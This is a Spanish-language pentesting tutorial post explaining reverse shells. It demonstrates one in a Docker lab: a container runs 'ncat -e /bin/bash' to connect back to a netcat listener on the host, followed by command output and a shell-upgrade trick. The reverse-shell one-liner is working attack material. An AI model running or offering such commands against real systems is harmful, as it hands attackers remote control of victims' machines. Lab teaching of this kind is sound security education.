---
layout: single
title: Reverse Shell
data 2025-02-27
header:
    teaser: /assets/images/slea32.png
categories:
    - Exploits
    - Shells
tags:
    - Reverse Shell
    - Remote Access
    - Network Attack
    - Command Execution
    - Shell Access
    - Pentesting
    - Hacking
    - Payload
---
Es un tipo de conexión remota que permite a un acatacante tomar el control de un sistema objetivo, pero de una manera un poco diferente a lo de una shell tradicional. En lugar que el atacante se conecte directamente al sistema objetivo (como una **Bind Shell**), el sistema objetivo unicia la conexión hacia el atacante, y es el atacante quien escucha esa conexión para tomar el control.

### Cómo funciona una Reverse Shell?:
El concepto detrás de la **Reverse Shell** es que un atacante configura un servidor (escuchando en un puerto determinado) y el sistema comprometido **se conecta de vuelta** al atacante, estableciendo la shel interactiva.
1. **El atacante** configura configura un servidor (escuchando en puerto en específico) en su máquina.
2. **El objetivo (víctima)** ejecuta el comando malicioso (por ejemplo, una vulnerabilidad explotada en una aplicación), lo que hace que el sistema comprometido inicie la conexión hacia el servidor del atacante.
3. una vez establecida la conexión, el atacante puede ejecutar **comandos remotos** en la máquina comprometido a través de la shell que se ha abierto.

---

### Reverse Shell en entorno controlado
Creamos un `Dockerfile`
```Dockerfile
FROM ubuntu:latest

ENV DEBIAN_FRONTEND noninteractive

RUN apt update && apt install -y apache2 \
  php

EXPOSE 80

ENTRYPOINT service apache2 start && /bin/bash
```
### máquina víctima
```bash
docker build -t my_image .
docker run -dit -p 80:80 --name myContainer my_image
docker exec -it myContainer bash
```
**Instalamos netcat en el contenedor**
```bash
apt install ncat
```

**Ponemos la IP de la maquina del contenedor la sacamos con nuestra máquina**:
```bash
ip addr | grep "docker0"
```

**Salida**
```bash
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
6: vethc67c219@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
``` 

**Desde el contenedor nos ponemos en escucha**:
```bash
ncat -e /bin/bash 172.17.0.1 443
```


### máquina atacante
**Abrimos una nueva ventana como `root`** nos ponemos en escucha:
```bash
nc -nlvp 443
```
`-n` para que no me aplique resolucion DNS
`-l` es escuchar (listen)
`-v` modo detallado (verbose)
`-p` especifica el puerto 

**Salida**
```bash
Connection from 172.17.0.2:53782
```
*Estamos conectados*

**Probamos haciendo**:
```bash
whoami
root
hostname -I
172.17.0.2
```

**Podemos verlo mejor la terminal hacemos un**:
```bash
script /dev/null -c bash
```

